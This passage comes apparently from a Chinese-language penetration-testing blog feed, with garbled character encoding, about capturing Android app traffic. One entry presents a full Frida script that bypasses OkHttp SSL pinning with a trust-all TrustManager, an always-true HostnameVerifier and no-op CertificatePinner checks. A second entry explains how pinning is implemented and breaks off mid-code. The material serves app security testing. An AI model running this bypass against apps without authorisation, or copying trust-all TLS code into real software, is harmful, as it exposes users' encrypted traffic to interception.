å…¥å‚æ•°ä¸ºç±»å<code>clsName</code>ï¼Œä½œç”¨æ˜¯è·å–åˆ°ç»è¿‡æ··æ·†åçš„<code>OkhttpClient</code>ç±»å</p><ul><li><p>è¦æ±‚ç±»åé•¿åº¦å¿…é¡»ä¸º2ï¼ˆæ­£å¸¸çš„<code>OkHttpClient</code>å…¨åä¸º<code>okhttp3.OkHttpClient</code>ï¼‰</p></li><li><p>è¦æ±‚å®ç°çš„æ¥å£æ•°é‡å¤§äºç­‰äº2ï¼ˆé»˜è®¤<code>OkHttpClient</code>å®ç°äº†2ä¸ªæ¥å£ï¼‰</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OkHttpClient</span> <span class="keyword">implements</span> <span class="title class_">Cloneable</span>, Call.Factory &#123;</span><br><span class="line">    <span class="comment">// ç±»çš„å®ç°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Cloneable</code>: è¿™ä¸ªæ¥å£æ¥è‡ª Java æ ‡å‡†åº“ï¼Œè¡¨æ˜ <code>OkHttpClient</code> ç±»å¯ä»¥è¢«å…‹éš†ã€‚</p><p><code>Call.Factory</code>: è¿™ä¸ªæ¥å£æ˜¯ <code>OkHttp</code> åº“çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå®šä¹‰äº†åˆ›å»º <code>Call</code> å®ä¾‹çš„æ–¹æ³•ã€‚<code>Call</code> å¯¹è±¡ç”¨äºå‘èµ· HTTP è¯·æ±‚ã€‚</p></li><li><p><code>for</code> å¾ªç¯éå†æ‰€æœ‰æ¥å£ï¼Œæ£€æŸ¥æ˜¯å¦åŒ…å« <code>Cloneable</code> æ¥å£ï¼Œå¹¶ä¸”ç¡®ä¿å…¶ä»–æ¥å£æ˜¯å†…éƒ¨ç±»æ¥å£ï¼ˆé€šè¿‡æ¥å£åä¸­åŒ…å« <code>$</code> ç¬¦å·æ¥åˆ¤æ–­ï¼‰</p></li><li><p>æ£€æŸ¥<code>OkHttpClient</code> ç±»æ˜¯å¦è‡³å°‘åŒ…å«ä¸€ä¸ªå†…éƒ¨ç±»ã€‚å¦‚æœæ²¡æœ‰è¿”å›false</p></li><li><p>å› ä¸º <code>OkHttpClient</code> æ˜¯ä¸€ä¸ªé¡¶å±‚ç±»ï¼Œå…¶çˆ¶ç±»åº”è¯¥æ˜¯ <code>Object</code>ã€‚</p></li></ul><p>å¦‚æœä¸Šè¿°æ¡ä»¶éƒ½æ»¡è¶³ï¼Œå°±å¯ä»¥è®¤ä¸ºè¿™ä¸ªç±»æ˜¯ <code>OkhttpClient</code> ç±»ã€‚</p><p>3ã€å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°<code>isCertificatePinner</code>ï¼Œç”¨æ¥è·å–ç»è¿‡æ··æ·†åçš„<code>CertificatePinner</code>ç±»</p><ul><li>æ£€æŸ¥åŒ…åæ˜¯å¦ä»¥prefixä¸ºå‰ç¼€ï¼Œè‹¥ä¸æ˜¯è¿”å›falseï¼Œå› ä¸º<code>CertificatePinner</code>å’Œ<code>OkhttpClient</code>éƒ½å±äº<code>Okhttp3</code>è¿™ä¸ªåŒ…åä¸‹çš„ã€‚</li><li>åˆ¤æ–­å½“å‰ç±»æ˜¯å¦æ˜¯å†…éƒ¨ç±»ï¼Œ<code>CertificatePinner</code>ä¸æ˜¯ä¸€ä¸ªå†…éƒ¨ç±»</li><li>åˆ¤æ–­å½“å‰ç±»ä»¥â€.â€åˆ†å‰²åï¼Œé•¿åº¦æ˜¯å¦ä¸º2ï¼Œå¦‚æœä¸æ˜¯è¿”å›false</li><li>åˆ¤æ–­å½“å‰ç±»æ˜¯å¦æ˜¯æ¥å£ï¼Œå¦‚æœæ˜¯è¿”å›false</li><li>åˆ¤æ–­å½“å‰ç±»æ˜¯å¦æœ‰æ¥å£ï¼Œå¦‚æœæœ‰è¿”å›false</li><li>åˆ¤æ–­å½“å‰ç±»ä¸­å†…éƒ¨ç±»çš„ä¸ªæ•°ï¼Œå¦‚æœæ²¡æœ‰è¿”å›false</li><li>åˆ¤æ–­å½“å‰ç±»æ˜¯å¦ç»§æ‰¿äº†Objectç±»ï¼Œå¦‚æœæ²¡æœ‰è¿”å›falseï¼Œå› ä¸º<code>CertificatePinner</code>æ˜¯é¡¶çº§ç±»</li><li>åˆ¤æ–­å½“å‰ç±»æ˜¯å¦æ˜¯finalä¿®é¥°çš„ï¼Œå¦‚æœæ˜¯è¿”å›false</li><li>è·å–å½“å‰ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•ï¼Œå¦‚æœæœ‰æ–¹æ³•å‚æ•°ä¸º<code>Certificate</code>ç±»å‹ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºæ˜¯<code>okhttp3.CertificatePinner</code>ç±»ã€‚</li></ul><h2 id="hook"><a href="#hook" class="headerlink" title="hook()"></a>hook()</h2><p>è¿™å—å¯¹å‰é¢è®²çš„ä¸‰ç§Hookæ€è·¯è¿›è¡Œå®ç°ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Modifier</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.reflect.Modifier&quot;</span>)  <span class="comment">//Modifier åå°„æ¡†æ¶æä¾›çš„ä¸€ä¸ªç±»ï¼Œå¯ä»¥åˆ¤æ–­å½“å‰è¿™ä¸ªç±»çš„ä¸€äº›å±æ€§ï¼Œå¦‚finalã€staticç­‰</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//TrustAllManagerï¼šè¿™æ®µä»£ç çš„ç›®çš„æ˜¯åˆ›å»ºä¸€ä¸ª SSL ä¸Šä¸‹æ–‡ï¼Œå®ƒä½¿ç”¨ä¸€ä¸ªè‡ªå®šä¹‰çš„ä¿¡ä»»ç®¡ç†å™¨æ¥ä¿¡ä»»æ‰€æœ‰çš„ SSL è¯ä¹¦ã€‚</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">TrustAllManagerClass</span> = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;    <span class="comment">//Java.registerClassæ˜¯firdaæä¾›çš„ï¼Œç”¨äºåŠ¨æ€æ³¨å†Œä¸€ä¸ª Java ç±»</span></span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;TrustAllManager&quot;</span>,</span><br><span class="line">            <span class="attr">implements</span>:[<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.X509TrustManager&quot;</span>)],</span><br><span class="line">            <span class="attr">methods</span>: &#123;</span><br><span class="line">                <span class="title function_">checkClientTrusted</span>(<span class="params">chain, authType</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(<span class="string">&quot;checkClientTrusted Called!!&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="title function_">checkServerTrusted</span>(<span class="params">chain, authType</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(<span class="string">&quot;checkServerTrusted Called!!&quot;</span>)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="title function_">getAcceptedIssuers</span>(<span class="params"></span>) &#123;</span><br><span class="line">                  <span class="keyword">return</span> [];</span><br><span class="line">                &#125;,</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">var</span> trustAllManagerHandle = <span class="title class_">TrustAllManagerClass</span>.$new()  <span class="comment">//åˆ›å»ºäº†ä¸€ä¸ª TrustAllManager ç±»çš„å®ä¾‹trustAllManagerHandle</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sslContext = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.SSLContext&quot;</span>).<span class="title function_">getInstance</span>(<span class="string">&quot;TLS&quot;</span>) <span class="comment">//è·å–äº†ä¸€ä¸ª SSLContext å®ä¾‹ï¼Œç”¨äºåˆ›å»º SSL å¥—æ¥å­—å’Œå¼•æ“</span></span><br><span class="line">        sslContext.<span class="title function_">init</span>(<span class="literal">null</span>,<span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&quot;Ljavax.net.ssl.X509TrustManager;&quot;</span>,[trustAllManagerHandle]),<span class="literal">null</span>) <span class="comment">//åˆå§‹åŒ– SSLContextï¼Œä¼ å…¥æˆ‘ä»¬åˆ›å»ºçš„ trustAllManagerHandle ä½œä¸ºä¿¡ä»»ç®¡ç†å™¨ã€‚</span></span><br><span class="line">        <span class="keyword">var</span> sslSocketFactory = sslContext.<span class="title function_">getSocketFactory</span>() <span class="comment">//ä» SSLContext å¯¹è±¡ä¸­è·å–ä¸€ä¸ª SSLSocketFactoryï¼Œè¿™ä¸ªå·¥å‚å¯ä»¥ç”¨æ¥åˆ›å»º SSL å¥—æ¥å­—ï¼Œè¿™äº›å¥—æ¥å­—å°†ä¼šä½¿ç”¨æˆ‘ä»¬çš„è‡ªå®šä¹‰ä¿¡ä»»ç®¡ç†å™¨ï¼Œä»è€Œä¿¡ä»»æ‰€æœ‰çš„ SSL è¯ä¹¦</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//HostnameVerifyï¼š</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">MyHostnameVerify</span> = <span class="title class_">Java</span>.<span class="title function_">registerClass</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;MyHostnameVerify&quot;</span>,</span><br><span class="line">            <span class="attr">implements</span>:[<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;javax.net.ssl.HostnameVerifier&quot;</span>)],</span><br><span class="line">            <span class="attr">methods</span>: &#123;</span><br><span class="line">                <span class="title function_">verify</span>(<span class="params">hostname, session</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(hostname)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">var</span> myHostnameVerifyHandle = <span class="title class_">MyHostnameVerify</span>.$new()</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> internalOkhttpClientClasses = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="title class_">OkhttpClientClassName</span>).<span class="property">class</span>.<span class="title function_">getDeclaredClasses</span>() <span class="comment">//è·å– OkhttpClientClassName ç±»å£°æ˜çš„æ‰€æœ‰å†…éƒ¨ç±»</span></span><br><span class="line">        internalOkhttpClientClasses.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">internalClass</span>) &#123; <span class="comment">//éå†ä¸Šä¸€æ­¥è·å–åˆ°çš„æ‰€æœ‰å†…éƒ¨ç±»</span></span><br><span class="line">            <span class="keyword">var</span> methods = internalClass.<span class="title function_">getDeclaredMethods</span>() <span class="comment">//è·å–å†…éƒ¨ç±»çš„æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line">            methods.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">method</span>) &#123;</span><br><span class="line">                 <span class="keyword">if</span>(method.<span class="title function_">getParameterCount</span>() &lt; <span class="number">1</span>)&#123;  <span class="comment">//æ£€æŸ¥æ–¹æ³•æ˜¯å¦æœ‰å‚æ•°ã€‚å¦‚æœæ²¡æœ‰å‚æ•°ï¼Œåˆ™è·³è¿‡å½“å‰æ–¹æ³•çš„å¤„ç†</span></span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">var</span> firstParameterTypeName = method.<span class="title function_">getParameterTypes</span>()[<span class="number">0</span>].<span class="title function_">getName</span>()  <span class="comment">//è·å–æ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°çš„ç±»å‹åç§°ã€‚</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(firstParameterTypeName == <span class="string">&quot;javax.net.ssl.SSLSocketFactory&quot;</span>)&#123; <span class="comment">//æ£€æŸ¥ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¦æ˜¯ SSLSocketFactory ç±»å‹ï¼Œå¦‚æœæ˜¯æ‰§è¡Œä¸‹é¢ä»£ç </span></span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Builder</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(internalClass.<span class="title function_">getName</span>())  <span class="comment">//è·å–okhttp.okhttpclinet$builder</span></span><br><span class="line">                    <span class="keyword">var</span> sslSocketFacotryMethodName  = method.<span class="title function_">getName</span>()  <span class="comment">//è·å–æ–¹æ³•çš„åç§°</span></span><br><span class="line">                    <span class="title class_">Builder</span>[sslSocketFacotryMethodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;  <span class="comment">//éå†è¯¥æ–¹æ³•çš„æ‰€æœ‰é‡è½½ç‰ˆæœ¬ã€‚</span></span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">SSLSocketFactory</span>)&#123;</span><br><span class="line">                            <span class="variable language_">arguments</span>[<span class="number">0</span>] = sslSocketFactory</span><br><span class="line">                            <span class="keyword">return</span> <span class="variable language_">this</span>[sslSocketFacotryMethodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Blue</span>(sslSocketFacotryMethodName+<span class="string">&quot;  Hooked!&quot;</span>)</span><br><span class="line">                    &#125;);</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(firstParameterTypeName == <span class="string">&quot;javax.net.ssl.HostnameVerifier&quot;</span>)&#123;  <span class="comment">//æ£€æŸ¥ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¦æ˜¯ HostnameVerifier ç±»å‹ï¼Œå¦‚æœæ˜¯æ‰§è¡Œä¸‹é¢ä»£ç ã€‚é€»è¾‘åŒä¸Š</span></span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Builder</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(internalClass.<span class="title function_">getName</span>())</span><br><span class="line">                    <span class="keyword">var</span> hostnameVerifierMethodName = method.<span class="title function_">getName</span>()</span><br><span class="line">                    <span class="title class_">Builder</span>[hostnameVerifierMethodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;</span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">hostnameVerifier</span>)&#123;</span><br><span class="line">                            <span class="variable language_">arguments</span>[<span class="number">0</span>] = myHostnameVerifyHandle</span><br><span class="line">                            <span class="keyword">return</span> <span class="variable language_">this</span>[hostnameVerifierMethodName].<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Yellow</span>(hostnameVerifierMethodName+<span class="string">&quot;  Hooked!&quot;</span>)</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(firstParameterTypeName == <span class="title class_">CertificatePinnerClassName</span>)&#123;  <span class="comment">//æ£€æŸ¥ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¦æ˜¯ CertificatePinnerClassName ç±»å‹</span></span><br><span class="line">                    <span class="keyword">var</span> <span class="title class_">Builder</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(internalClass.<span class="title function_">getName</span>())</span><br><span class="line">                    <span class="keyword">var</span> certificatePinnerMethodName = method.<span class="title function_">getName</span>()</span><br><span class="line"></span><br><span class="line">                    <span class="title class_">Builder</span>[certificatePinnerMethodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">overload</span>)&#123;</span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">certificatePinner</span>)&#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">retain</span>(<span class="variable language_">this</span>)</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title class_">Purple</span>(certificatePinnerMethodName+<span class="string">&quot;  Hooked!&quot;</span>)</span><br><span class="line">                    &#125;);</span><br><span class="line">                   </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//è¿™æ®µä»£ç çš„ç›®çš„æ˜¯hook CertificatePinnerç±»çš„æ‰€æœ‰è¿”å›ç±»å‹ä¸º void çš„æ–¹æ³•ï¼Œå¹¶åœ¨è¿™äº›æ–¹æ³•è¢«è°ƒç”¨æ—¶æ‰“å°ä¸€æ¡æ¶ˆæ¯åˆ°æ§åˆ¶å°</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">CertificatePinnerClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="title class_">CertificatePinnerClassName</span>)  <span class="comment">//CertificatePinnerç±»</span></span><br><span class="line">        <span class="keyword">var</span> methods = <span class="title class_">CertificatePinnerClass</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>()  <span class="comment">//å¾—åˆ°CertificatePinnerçš„æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line">        methods.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">method</span>)&#123;  <span class="comment">//éå†æ‰€æœ‰çš„æ–¹æ³•</span></span><br><span class="line">            <span class="keyword">if</span>(method.<span class="title function_">getReturnType</span>().<span class="title function_">getName</span>() == <span class="string">&#x27;void&#x27;</span>)&#123;  <span class="comment">//åˆ¤æ–­å¦‚æœæ–¹æ³•è¿”å›ç±»å‹ä¸ºvoid</span></span><br><span class="line">                <span class="keyword">var</span> methodName = method.<span class="title function_">getName</span>()</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(methodName+<span class="string">&quot; Hooked!&quot;</span>)</span><br><span class="line">                <span class="title class_">CertificatePinnerClass</span>[methodName].<span class="property">overloads</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">overload</span>)&#123;  <span class="comment">//éå†å½“å‰æ–¹æ³•çš„æ‰€æœ‰é‡è½½æ–¹æ³•</span></span><br><span class="line">                    <span class="keyword">if</span>(overload.<span class="property">returnType</span>.<span class="property">name</span> == <span class="string">&#x27;V&#x27;</span>)&#123;</span><br><span class="line">                        overload.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                            <span class="variable language_">console</span>.<span class="title class_">Cyan</span>(<span class="string">&quot;certificatePinner check called!&quot;</span>)</span><br><span class="line">                        &#125;   </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APPæŠ“åŒ… </tag>
            
            <tag> sslunpinning </tag>
            
            <tag> okhttp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æŠ“åŒ…ä¹‹sslunpinning</title>
      <link href="/2024/07/04/%E6%8A%93%E5%8C%85%E4%B9%8Bsslunpinning/"/>
      <url>/2024/07/04/%E6%8A%93%E5%8C%85%E4%B9%8Bsslunpinning/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x01-å®¢æˆ·ç«¯æ®µSSLè¯ä¹¦ç»‘å®š"><a href="#0x01-å®¢æˆ·ç«¯æ®µSSLè¯ä¹¦ç»‘å®š" class="headerlink" title="0x01 å®¢æˆ·ç«¯æ®µSSLè¯ä¹¦ç»‘å®š"></a>0x01 å®¢æˆ·ç«¯æ®µSSLè¯ä¹¦ç»‘å®š</h1><p>SSL Pinning ä¹Ÿç§°ä¸ºè¯ä¹¦é”å®šï¼Œæ˜¯Googleå®˜æ–¹æ¨èçš„æ£€éªŒæ–¹å¼ï¼Œæ„æ€æ˜¯å°†æœåŠ¡å™¨æä¾›çš„SSL&#x2F;TLSè¯ä¹¦å†…ç½®åˆ°ç§»åŠ¨å®¢æˆ·ç«¯ï¼Œå½“å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚çš„æ—¶å€™ï¼Œé€šè¿‡å¯¹æ¯”å†…ç½®çš„è¯ä¹¦ä¸æœåŠ¡å™¨çš„è¯ä¹¦æ˜¯å¦ä¸€è‡´ï¼Œæ¥ç¡®è®¤è¿™ä¸ªè¿æ¥çš„åˆæ³•æ€§ã€‚</p><p>SSL Pinning ä¸€èˆ¬å®ç°æ–¹å¼æœ‰ä¸¤ç§</p><ul><li>ä¸€ç§æ˜¯åœ¨ä»£ç å±‚è¿›è¡Œæ ¡éªŒ</li><li>ä¸€ç§æ˜¯é€šè¿‡é…ç½®æ–‡ä»¶network_security_config.xmlè¿›è¡Œé…ç½®å®ç°æ ¡éªŒã€‚</li></ul><h2 id="ä»£ç å±‚å®ç°"><a href="#ä»£ç å±‚å®ç°" class="headerlink" title="ä»£ç å±‚å®ç°"></a>ä»£ç å±‚å®ç°</h2><p>ä»¥å¸¸è§çš„OKHttpç½‘ç»œæ¡†æ¶ä¸¾ä¾‹ï¼Œåœ¨ä»£ç å±‚é¢æ ¡éªŒè¯ä¹¦çš„ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407051610003.png" alt="image.png"> </p><p>è¯¦ç»†çš„ä»£ç å®ç°å¯ä»¥å‚è€ƒï¼š</p><p><a href="https://github.com/act0rn/https-capture/blob/main/NetCaptureTest/app/src/main/java/com/actorn/netcapture/MainActivity.java">https-capture&#x2F;NetCaptureTest&#x2F;app&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;actorn&#x2F;netcapture&#x2F;MainActivity.java at main Â· act0rn&#x2F;https-capture (github.com)</a></p><h2 id="é…ç½®æ–‡ä»¶å®ç°"><a href="#é…ç½®æ–‡ä»¶å®ç°" class="headerlink" title="é…ç½®æ–‡ä»¶å®ç°"></a>é…ç½®æ–‡ä»¶å®ç°</h2><p>é€šè¿‡ res&#x2F;xml&#x2F;network_security_config.xml è¿›è¡Œé…ç½®ï¼Œå®ç°SSL Pinningï¼Œé…ç½®æ–‡ä»¶å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼Œä½¿ç”¨è¯ä¹¦æ ¡éªŒå’Œå…¬é’¥æ ¡éªŒã€‚</p><ul><li><p>ä½¿ç”¨è¯ä¹¦é”å®šï¼Œç”±äºCAç­¾å‘è¯ä¹¦å­˜åœ¨æœ‰æ•ˆæœŸçš„é—®é¢˜ï¼Œæ‰€ä»¥åœ¨è¯ä¹¦ç»­æœŸåï¼Œéœ€è¦å°†è¯ä¹¦é‡æ–°å†…ç½®åˆ°Appä¸­ï¼ˆä¸æ–¹ä¾¿ï¼Œåº”ç”¨è¾ƒå°‘ï¼‰ã€‚</p></li><li><p>ä½¿ç”¨å…¬é’¥é”å®šï¼Œéœ€è¦æå–è¯ä¹¦ä¸­çš„å…¬é’¥å¹¶å†…ç½®åˆ°appä¸­ï¼Œå…¬é’¥åœ¨è¯ä¹¦ç»­æœŸåå¯ä»¥ä¿æŒä¸å˜(å³å¯†é’¥å¯¹å¯ä»¥ä¸å˜)ï¼Œå¯ä»¥é¿å…æœ‰æ•ˆæœŸé—®é¢˜ã€‚</p></li></ul><p>ä¸‹é¢æˆ‘ä»¬å…ˆçœ‹çœ‹è¯ä¹¦é”å®šå’Œå…¬é’¥é”å®šçš„å…·ä½“é…ç½®å®ç°ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407051626956.png" alt="image.png"> </p><h2 id="å•å‘è®¤è¯æ ¡éªŒæµç¨‹"><a href="#å•å‘è®¤è¯æ ¡éªŒæµç¨‹" class="headerlink" title="å•å‘è®¤è¯æ ¡éªŒæµç¨‹"></a>å•å‘è®¤è¯æ ¡éªŒæµç¨‹</h2><p>å…·ä½“çš„SSLPinningçš„äº¤äº’è¿‡ç¨‹ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æµç¨‹å›¾æ¥è¡¨ç¤ºï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407051627575.jpeg" alt="img"> </p><p>é€šè¿‡SSL PINNINGç»‘å®šè¯ä¹¦ä»¥åï¼Œè®¾ç½®ç³»ç»Ÿä»£ç†ï¼Œå³ä½¿å°†æŠ“åŒ…å·¥å…·çš„è¯ä¹¦å¯¼å…¥åˆ°ç³»ç»Ÿç›®å½•ï¼ŒæŠ“åŒ…æ—¶ä¾ç„¶ä¼šå‘ç°AppæŠ¥é”™ï¼šjavax.net.ssl.SSLPeerUnverifiedException: Certificate pinning failure! æˆ–è€… javax.net.ssl.SSLHandshakeException: java.security.cert.CertPathValidatorException: Trust anchor for certification path not found.ï¼ŒæŠ¥é”™çš„åŸå› æ˜¯<strong>APPé¢„ç½®çš„è¯ä¹¦ä¿¡æ¯ä¸æœåŠ¡ç«¯è¿”å›çš„è¯ä¹¦ä¿¡æ¯æ ¡éªŒä¸ä¸€è‡´ï¼Œå¯¼è‡´æ¡æ‰‹å¤±è´¥</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407051633231.png" alt="img"> </p><h1 id="0x02-SSLPinningåŸç†"><a href="#0x02-SSLPinningåŸç†" class="headerlink" title="0x02 SSLPinningåŸç†"></a>0x02 SSLPinningåŸç†</h1><h2 id="ä»£ç è§£è¯»"><a href="#ä»£ç è§£è¯»" class="headerlink" title="ä»£ç è§£è¯»"></a>ä»£ç è§£è¯»</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407051659654.png" alt="image.png"> </p><p>å°†ä»£ç åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š</p><ol><li>è°ƒç”¨x509çš„æ ‡å‡†ï¼Œåˆ›å»ºäº†ä¸€ä¸ªè¯ä¹¦ï¼ˆåŒ…å«å…¬é’¥ã€ç­¾å‘ä¿¡æ¯ç­‰ç­‰ï¼‰ï¼›</li><li>ç”Ÿæˆè¯ä¹¦ä»“åº“keyStoreå¹¶åˆå§‹åŒ–ï¼Œå°†ç¬¬ä¸€æ­¥åˆ›å»ºçš„è¯ä¹¦åŠ è½½åˆ°keyStoreä¸­ï¼›</li><li>é¦–å…ˆæ‹¿åˆ°é»˜è®¤çš„ä¿¡ä»»ç®¡ç†å™¨å·¥å‚ï¼Œå°†keyStoreåŠ è½½è¿›å»ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦æœ‰å­˜åœ¨äºKeyStoreä¸­çš„è¯ä¹¦ï¼Œæ˜¯å¯ä»¥æ ¡éªŒé€šè¿‡çš„ï¼›</li><li>æ–°å»ºäº†SSLçš„å¯¹è±¡ï¼Œç”¨æ¥åšSSLæ¡æ‰‹ã€‚è¿›è¡Œäº†initåˆå§‹åŒ–ï¼Œé‡Œé¢æœ‰ä¸‰ä¸ªå‚æ•°ï¼š</li><li>km:null&#x3D;&#x3D;&gt;åšæœåŠ¡ç«¯æ ¡éªŒï¼ˆæœåŠ¡ç«¯æ ¡éªŒå®¢æˆ·ç«¯è¯ä¹¦)</li><li>trustManagers&#x3D;&#x3D;&gt;åšå®¢æˆ·ç«¯æ ¡éªŒï¼ˆå®¢æˆ·ç«¯æ ¡éªŒæœåŠ¡ç«¯è¯ä¹¦ï¼‰</li><li>new SecureRandom()&#x3D;&#x3D;&gt;SSLæ¡æ‰‹è¿‡ç¨‹ä¸­åˆ›å»ºéšæœºæ•°ï¼Œå®‰å…¨è€ƒè™‘</li><li>ä¸Šé¢çš„å››ä¸ªæ­¥éª¤å…¶å®éƒ½æ˜¯ä¸ºä¸‹é¢åšé“ºå«çš„ï¼Œè¿™å—è°ƒç”¨äº†OKHttp.builderæ¡†æ¶ï¼Œå®ç°äº†<strong>ä¿¡ä»»è¯ä¹¦å·¥å‚ä¸­çš„è¯ä¹¦ï¼Œä¸ä¿¡ä»»ç³»ç»Ÿè¯ä¹¦</strong>ã€‚ã€ç¬¬ä¸€å±‚æ ¡éªŒã€‘</li><li>è¯ä¹¦ç»‘å®šï¼Œä¹Ÿæ˜¯SSLPinningçš„ä¸€ç§æ ¡éªŒæ–¹å¼ã€‚ã€ç¬¬äºŒæ¬¡æ ¡éªŒã€‘</li><li>HostnameVerifierï¼Œä¹Ÿæ˜¯ä¸€ç§æ ¡éªŒæ–¹å¼ã€ç¬¬ä¸‰å±‚æ ¡éªŒã€‘</li></ol><p>ä¸‹é¢çš„ä»£ç å¯ä»¥çœ‹åšæ˜¯ä¸€äº›å¸¸è§çš„<code>SSLPinning</code>å®ç°çš„ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç¬¬ä¸€ç§æ ¡éªŒæ–¹å¼ï¼šHostnameVerifier</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sendRequestWithOkHttp1</span><span 